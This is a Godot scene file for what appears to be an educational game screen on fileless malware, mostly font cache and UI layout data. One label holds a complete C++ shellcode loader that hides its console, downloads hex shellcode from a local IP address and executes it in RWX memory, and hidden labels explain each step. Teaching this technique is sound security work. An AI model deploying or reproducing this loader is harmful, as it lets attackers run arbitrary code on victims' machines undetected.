[gd_scene load_steps=5 format=3 uid="uid://huaemy4l10n5"]

[ext_resource type="Shader" uid="uid://cectl5tsuf1ys" path="res://EnvironmentShaders/silhouette_test.gdshader" id="1_y7f7g"]
[ext_resource type="Script" uid="uid://8c20w85u1pnm" path="res://Scenes/GUI/Fileless Malware/silhouette.gd" id="2_mf5oi"]

[sub_resource type="FontFile" id="FontFile_osuku"]
subpixel_positioning = 0
msdf_pixel_range = 14
msdf_size = 128
cache/0/16/0/ascent = 0.0
cache/0/16/0/descent = 0.0
cache/0/16/0/underline_position = 0.0
cache/0/16/0/underline_thickness = 0.0
cache/0/16/0/scale = 1.0
cache/0/2/0/ascent = 0.0
cache/0/2/0/descent = 0.0
cache/0/2/0/underline_position = 0.0
cache/0/2/0/underline_thickness = 0.0
cache/0/2/0/scale = 1.0
cache/0/3/0/ascent = 0.0
cache/0/3/0/descent = 0.0
cache/0/3/0/underline_position = 0.0
cache/0/3/0/underline_thickness = 0.0
cache/0/3/0/scale = 1.0
cache/0/1/0/ascent = 0.0
cache/0/1/0/descent = 0.0
cache/0/1/0/underline_position = 0.0
cache/0/1/0/underline_thickness = 0.0
cache/0/1/0/scale = 1.0
cache/0/4/0/ascent = 0.0
cache/0/4/0/descent = 0.0
cache/0/4/0/underline_position = 0.0
cache/0/4/0/underline_thickness = 0.0
cache/0/4/0/scale = 1.0
cache/0/5/0/ascent = 0.0
cache/0/5/0/descent = 0.0
cache/0/5/0/underline_position = 0.0
cache/0/5/0/underline_thickness = 0.0
cache/0/5/0/scale = 1.0
cache/0/6/0/ascent = 0.0
cache/0/6/0/descent = 0.0
cache/0/6/0/underline_position = 0.0
cache/0/6/0/underline_thickness = 0.0
cache/0/6/0/scale = 1.0
cache/0/7/0/ascent = 0.0
cache/0/7/0/descent = 0.0
cache/0/7/0/underline_position = 0.0
cache/0/7/0/underline_thickness = 0.0
cache/0/7/0/scale = 1.0
cache/0/8/0/ascent = 0.0
cache/0/8/0/descent = 0.0
cache/0/8/0/underline_position = 0.0
cache/0/8/0/underline_thickness = 0.0
cache/0/8/0/scale = 1.0
cache/0/9/0/ascent = 0.0
cache/0/9/0/descent = 0.0
cache/0/9/0/underline_position = 0.0
cache/0/9/0/underline_thickness = 0.0
cache/0/9/0/scale = 1.0
cache/0/10/0/ascent = 0.0
cache/0/10/0/descent = 0.0
cache/0/10/0/underline_position = 0.0
cache/0/10/0/underline_thickness = 0.0
cache/0/10/0/scale = 1.0
cache/0/11/0/ascent = 0.0
cache/0/11/0/descent = 0.0
cache/0/11/0/underline_position = 0.0
cache/0/11/0/underline_thickness = 0.0
cache/0/11/0/scale = 1.0
cache/0/12/0/ascent = 0.0
cache/0/12/0/descent = 0.0
cache/0/12/0/underline_position = 0.0
cache/0/12/0/underline_thickness = 0.0
cache/0/12/0/scale = 1.0
cache/0/14/0/ascent = 0.0
cache/0/14/0/descent = 0.0
cache/0/14/0/underline_position = 0.0
cache/0/14/0/underline_thickness = 0.0
cache/0/14/0/scale = 1.0
cache/0/19/0/ascent = 0.0
cache/0/19/0/descent = 0.0
cache/0/19/0/underline_position = 0.0
cache/0/19/0/underline_thickness = 0.0
cache/0/19/0/scale = 1.0
cache/0/24/0/ascent = 0.0
cache/0/24/0/descent = 0.0
cache/0/24/0/underline_position = 0.0
cache/0/24/0/underline_thickness = 0.0
cache/0/24/0/scale = 1.0
cache/0/44/0/ascent = 0.0
cache/0/44/0/descent = 0.0
cache/0/44/0/underline_position = 0.0
cache/0/44/0/underline_thickness = 0.0
cache/0/44/0/scale = 1.0
cache/0/64/0/ascent = 0.0
cache/0/64/0/descent = 0.0
cache/0/64/0/underline_position = 0.0
cache/0/64/0/underline_thickness = 0.0
cache/0/64/0/scale = 1.0
cache/0/79/0/ascent = 0.0
cache/0/79/0/descent = 0.0
cache/0/79/0/underline_position = 0.0
cache/0/79/0/underline_thickness = 0.0
cache/0/79/0/scale = 1.0
cache/0/94/0/ascent = 0.0
cache/0/94/0/descent = 0.0
cache/0/94/0/underline_position = 0.0
cache/0/94/0/underline_thickness = 0.0
cache/0/94/0/scale = 1.0
cache/0/99/0/ascent = 0.0
cache/0/99/0/descent = 0.0
cache/0/99/0/underline_position = 0.0
cache/0/99/0/underline_thickness = 0.0
cache/0/99/0/scale = 1.0
cache/0/114/0/ascent = 0.0
cache/0/114/0/descent = 0.0
cache/0/114/0/underline_position = 0.0
cache/0/114/0/underline_thickness = 0.0
cache/0/114/0/scale = 1.0
cache/0/129/0/ascent = 0.0
cache/0/129/0/descent = 0.0
cache/0/129/0/underline_position = 0.0
cache/0/129/0/underline_thickness = 0.0
cache/0/129/0/scale = 1.0
cache/0/134/0/ascent = 0.0
cache/0/134/0/descent = 0.0
cache/0/134/0/underline_position = 0.0
cache/0/134/0/underline_thickness = 0.0
cache/0/134/0/scale = 1.0
cache/0/139/0/ascent = 0.0
cache/0/139/0/descent = 0.0
cache/0/139/0/underline_position = 0.0
cache/0/139/0/underline_thickness = 0.0
cache/0/139/0/scale = 1.0
cache/0/144/0/ascent = 0.0
cache/0/144/0/descent = 0.0
cache/0/144/0/underline_position = 0.0
cache/0/144/0/underline_thickness = 0.0
cache/0/144/0/scale = 1.0
cache/0/149/0/ascent = 0.0
cache/0/149/0/descent = 0.0
cache/0/149/0/underline_position = 0.0
cache/0/149/0/underline_thickness = 0.0
cache/0/149/0/scale = 1.0
cache/0/154/0/ascent = 0.0
cache/0/154/0/descent = 0.0
cache/0/154/0/underline_position = 0.0
cache/0/154/0/underline_thickness = 0.0
cache/0/154/0/scale = 1.0
cache/0/159/0/ascent = 0.0
cache/0/159/0/descent = 0.0
cache/0/159/0/underline_position = 0.0
cache/0/159/0/underline_thickness = 0.0
cache/0/159/0/scale = 1.0
cache/0/124/0/ascent = 0.0
cache/0/124/0/descent = 0.0
cache/0/124/0/underline_position = 0.0
cache/0/124/0/underline_thickness = 0.0
cache/0/124/0/scale = 1.0
cache/0/104/0/ascent = 0.0
cache/0/104/0/descent = 0.0
cache/0/104/0/underline_position = 0.0
cache/0/104/0/underline_thickness = 0.0
cache/0/104/0/scale = 1.0
cache/0/89/0/ascent = 0.0
cache/0/89/0/descent = 0.0
cache/0/89/0/underline_position = 0.0
cache/0/89/0/underline_thickness = 0.0
cache/0/89/0/scale = 1.0
cache/0/84/0/ascent = 0.0
cache/0/84/0/descent = 0.0
cache/0/84/0/underline_position = 0.0
cache/0/84/0/underline_thickness = 0.0
cache/0/84/0/scale = 1.0
cache/0/69/0/ascent = 0.0
cache/0/69/0/descent = 0.0
cache/0/69/0/underline_position = 0.0
cache/0/69/0/underline_thickness = 0.0
cache/0/69/0/scale = 1.0
cache/0/59/0/ascent = 0.0
cache/0/59/0/descent = 0.0
cache/0/59/0/underline_position = 0.0
cache/0/59/0/underline_thickness = 0.0
cache/0/59/0/scale = 1.0
cache/0/54/0/ascent = 0.0
cache/0/54/0/descent = 0.0
cache/0/54/0/underline_position = 0.0
cache/0/54/0/underline_thickness = 0.0
cache/0/54/0/scale = 1.0
cache/0/49/0/ascent = 0.0
cache/0/49/0/descent = 0.0
cache/0/49/0/underline_position = 0.0
cache/0/49/0/underline_thickness = 0.0
cache/0/49/0/scale = 1.0
cache/0/74/0/ascent = 0.0
cache/0/74/0/descent = 0.0
cache/0/74/0/underline_position = 0.0
cache/0/74/0/underline_thickness = 0.0
cache/0/74/0/scale = 1.0
cache/0/39/0/ascent = 0.0
cache/0/39/0/descent = 0.0
cache/0/39/0/underline_position = 0.0
cache/0/39/0/underline_thickness = 0.0
cache/0/39/0/scale = 1.0
cache/0/29/0/ascent = 0.0
cache/0/29/0/descent = 0.0
cache/0/29/0/underline_position = 0.0
cache/0/29/0/underline_thickness = 0.0
cache/0/29/0/scale = 1.0
cache/0/20/0/ascent = 0.0
cache/0/20/0/descent = 0.0
cache/0/20/0/underline_position = 0.0
cache/0/20/0/underline_thickness = 0.0
cache/0/20/0/scale = 1.0
cache/0/15/0/ascent = 0.0
cache/0/15/0/descent = 0.0
cache/0/15/0/underline_position = 0.0
cache/0/15/0/underline_thickness = 0.0
cache/0/15/0/scale = 1.0
cache/0/18/0/ascent = 0.0
cache/0/18/0/descent = 0.0
cache/0/18/0/underline_position = 0.0
cache/0/18/0/underline_thickness = 0.0
cache/0/18/0/scale = 1.0

[sub_resource type="ShaderMaterial" id="ShaderMaterial_gifo5"]
shader = ExtResource("1_y7f7g")
shader_parameter/rect_color = Color(0, 0, 0, 0.505882)
shader_parameter/hole_position = Vector2(0.015, 0.31)
shader_parameter/hole_size = Vector2(2.05, 0.33)

[node name="Control" type="Control"]
layout_mode = 3
anchors_preset = 15
anchor_right = 1.0
anchor_bottom = 1.0
grow_horizontal = 2
grow_vertical = 2

[node name="Background" type="ColorRect" parent="."]
layout_mode = 1
anchors_preset = 15
anchor_right = 1.0
anchor_bottom = 1.0
grow_horizontal = 2
grow_vertical = 2
color = Color(0.39637, 0.465726, 0.669098, 1)

[node name="Header" type="ColorRect" parent="."]
layout_mode = 1
anchors_preset = -1
anchor_right = 1.0
anchor_bottom = 0.074
offset_bottom = 0.0480003
grow_horizontal = 2
scale = Vector2(1.00035, 0.980913)
color = Color(0.239216, 0.239216, 0.239216, 1)

[node name="Button" type="Button" parent="."]
layout_mode = 1
anchors_preset = -1
anchor_left = 0.891
anchor_top = 0.014
anchor_right = 0.935
anchor_bottom = 0.062
offset_left = -0.432007
offset_top = -0.0720005
offset_right = -0.120117
offset_bottom = -0.176003
grow_horizontal = 2
text = "Run"

[node name="Title" type="Label" parent="."]
layout_mode = 1
anchors_preset = -1
anchor_left = 0.461
anchor_top = 0.019
anchor_right = 0.539
anchor_bottom = 0.057
offset_left = 4.42798
offset_top = -0.312001
offset_right = -4.42804
offset_bottom = -1.936
grow_horizontal = 2
theme_override_fonts/font = SubResource("FontFile_osuku")
theme_override_font_sizes/font_size = 18
text = "VSCode"

[node name="Body" type="ColorRect" parent="."]
layout_mode = 1
anchors_preset = -1
anchor_top = 0.074
anchor_right = 1.0
anchor_bottom = 1.0
offset_left = 22.0
offset_top = 43.048
grow_horizontal = 2
grow_vertical = 0
color = Color(0.239216, 0.239216, 0.239216, 1)

[node name="Sidebar" type="ColorRect" parent="."]
layout_mode = 1
anchors_preset = -1
anchor_right = 0.019
anchor_bottom = 1.0
offset_top = 91.0
offset_right = 0.112001
grow_vertical = 2
color = Color(0.239216, 0.239216, 0.239216, 1)

[node name="Linenumbers" type="Label" parent="."]
layout_mode = 1
anchors_preset = -1
anchor_left = 0.002
anchor_top = 0.136
anchor_right = 0.018
anchor_bottom = 0.998
offset_left = -0.304
offset_top = -0.128006
offset_right = 5.264
offset_bottom = 472.296
theme_override_constants/line_spacing = -5
text = " 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
 "
autowrap_mode = 1

[node name="Silhouette" type="ColorRect" parent="."]
visible = false
material = SubResource("ShaderMaterial_gifo5")
layout_mode = 1
anchors_preset = 15
anchor_right = 1.0
anchor_bottom = 1.0
grow_horizontal = 2
grow_vertical = 2
script = ExtResource("2_mf5oi")

[node name="File1Header" type="ColorRect" parent="."]
layout_mode = 1
anchors_preset = -1
anchor_top = 0.074
anchor_right = 1.0
anchor_bottom = 0.142
offset_top = 0.0480003
offset_right = -962.0
offset_bottom = -1.01601
grow_horizontal = 2
color = Color(0.239216, 0.239216, 0.239216, 1)

[node name="FileName1" type="Label" parent="File1Header"]
layout_mode = 1
anchors_preset = -1
anchor_left = 0.168
anchor_top = 0.163
anchor_right = 0.789
anchor_bottom = 0.744
offset_left = 0.079998
offset_top = -0.00899839
offset_right = 0.0899963
offset_bottom = 0.00799942
grow_horizontal = 2
theme_override_fonts/font = SubResource("FontFile_osuku")
theme_override_font_sizes/font_size = 18
text = "Boilerplate.cpp"

[node name="Header4" type="ColorRect" parent="."]
layout_mode = 1
anchors_preset = -1
anchor_top = 0.074
anchor_right = 1.0
anchor_bottom = 0.142
offset_left = 192.0
offset_top = 0.0480003
offset_bottom = -1.01601
grow_horizontal = 2
color = Color(0.101961, 0.0941176, 0.0823529, 1)

[node name="VSCode_IDE" type="Label" parent="."]
layout_mode = 1
anchors_preset = -1
anchor_left = 0.022
anchor_top = 0.076
anchor_right = 0.497
anchor_bottom = 0.722
offset_left = -1.344
offset_top = 38.752
offset_right = 189.456
offset_bottom = 39.144
theme_override_constants/line_spacing = -5
text = "#include <iostream>
#include <cpr/cpr.h>
#include <windows.h>

int main() {

    ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;
    
    cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.29.208/home\" });
    char* memBuffer = NULL;
    memBuffer = (char *)r.text.c_str();

    unsigned char shellcode[382]; // This is the size of shellcode
    memBuffer += 2;
    for (size_t count = 0; count < sizeof shellcode - 1; count++) {
        sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]);
        memBuffer = memBuffer + 4;
    }

    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_
EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();
}"

[node name="Explanation Part1" type="Label" parent="VSCode_IDE"]
visible = false
layout_mode = 1
anchors_preset = -1
anchor_left = 0.779
anchor_top = 0.064
anchor_right = 1.225
anchor_bottom = 0.897
offset_left = 0.0979614
offset_top = 0.191999
offset_right = -0.279968
offset_bottom = 2.58099
theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
text = "Now let's create the boilerplate 

Hides the console window so the program runs silently.

If SW_SHOW is used instead, the window would remain visible. 


"
autowrap_mode = 3
justification_flags = 162

[node name="Explanation Part2" type="Label" parent="VSCode_IDE"]
visible = false
layout_mode = 1
anchors_preset = -1
anchor_left = 0.779
anchor_top = 0.065
anchor_right = 1.225
anchor_bottom = 0.873
offset_left = 0.0979614
offset_top = 0.186998
offset_right = -0.279968
offset_bottom = -0.125
theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
text = "Downloads data from the URL using the CPR library.

The shellcode is expected to be hosted at this address."
autowrap_mode = 3
justification_flags = 162

[node name="Explanation Part3" type="Label" parent="VSCode_IDE"]
visible = false
layout_mode = 1
anchors_preset = -1
anchor_left = 0.779
anchor_top = 0.066
anchor_right = 1.225
anchor_bottom = 0.366
offset_left = 0.0979614
offset_top = 0.158001
offset_right = -0.0499878
offset_bottom = 0.0579834
theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
text = "Points memBuffer to the downloaded text content.

Converts it into a raw C-style pointer for processing."
autowrap_mode = 3
justification_flags = 162

[node name="Explanation Part4" type="Label" parent="VSCode_IDE"]
visible = false
layout_mode = 1
anchors_preset = -1
anchor_left = 0.779
anchor_top = 0.065
anchor_right = 1.225
anchor_bottom = 0.22
offset_left = 0.0979614
offset_top = 0.594997
offset_right = -0.0499878
offset_bottom = -0.140007
theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
text = "Creates an array to hold 382 bytes of actual machine code (the payload)."
autowrap_mode = 3
justification_flags = 162

[node name="Explanation Part5" type="Label" parent="VSCode_IDE"]
visible = false
layout_mode = 1
anchors_preset = -1
anchor_left = 0.779
anchor_top = 0.066
anchor_right = 1.225
anchor_bottom = 0.719
offset_left = 0.0979614
offset_top = 0.158001
offset_right = -0.0499878
offset_bottom = -0.203003
theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
text = "Skips the first two characters of the text (likely formatting such as 0x).

Reads two hex digits at a time from memBuffer and converts them to a byte.

Stores each byte into the shellcode array.

Moves the pointer forward by 4 characters each loop because the text format likely uses \\x??. "
autowrap_mode = 3
justification_flags = 162

[node name="Explanation Part6" type="Label" parent="VSCode_IDE"]
visible = false
layout_mode = 1
anchors_preset = -1
anchor_left = 0.779
anchor_top = 0.066
anchor_right = 1.225
anchor_bottom = 0.368
offset_left = 0.0979614
offset_top = 0.158001
offset_right = -0.0499878
offset_bottom = 0.18399
theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
text = "Asks Windows to allocate memory that can be read, written, and executed.

Copies the parsed shellcode bytes into that memory block."
autowrap_mode = 3
justification_flags = 162

[node name="Explanation Part7" type="Label" parent="VSCode_IDE"]
visible = false
layout_mode = 1
anchors_preset = -1
anchor_left = 0.779
anchor_top = 0.066
anchor_right = 1.225
anchor_bottom = 0.371
offset_left = 0.0979614
offset_top = 0.158001
offset_right = -0.0499878
offset_bottom = -0.127014
theme_override_colors/font_color = Color(0.759059, 0.703435, 0.355522, 1)
text = "Treats the memory block as a function and calls it directly.

This makes the downloaded shellcode run immediately."
autowrap_mode = 3
justification_flags = 162
